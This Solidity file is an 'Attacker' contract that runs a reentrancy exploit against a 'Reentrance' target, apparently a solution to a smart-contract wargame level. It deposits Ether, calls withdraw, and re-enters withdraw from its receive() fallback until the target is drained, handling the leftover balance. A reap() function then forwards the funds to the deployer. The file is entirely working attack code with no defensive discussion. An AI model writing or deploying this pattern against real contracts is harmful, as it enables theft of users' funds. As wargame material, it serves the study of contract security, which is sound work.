// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Reentrance} from "~/Reentrance.sol";

contract Attacker {
    address payable public owner;
    Reentrance targetContract;
    uint256 donation;

    constructor(address payable _targetAddr) {
        targetContract = Reentrance(_targetAddr);
        owner = payable(msg.sender);
    }

    // reap the rewards of your attack
    function reap() external {
        owner.transfer(address(this).balance);
    }

    // begin attack by depositing and withdrawing
    // when all functions return, we will transfer funds to owner
    function attack() external payable {
        donation = msg.value;
        targetContract.donate{value: donation}(address(this));
        targetContract.withdraw(donation);
    }

    // point of re-entry
    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= donation) {
            // withdraw at most your balance at a time
            targetContract.withdraw(donation);
        } else if (targetBalance > 0) {
            // withdraw the remaining balance in the contract
            // this edge case is when attacker donation does not
            // perfectly divide the target balance
            targetContract.withdraw(targetBalance);
        }
    }
}
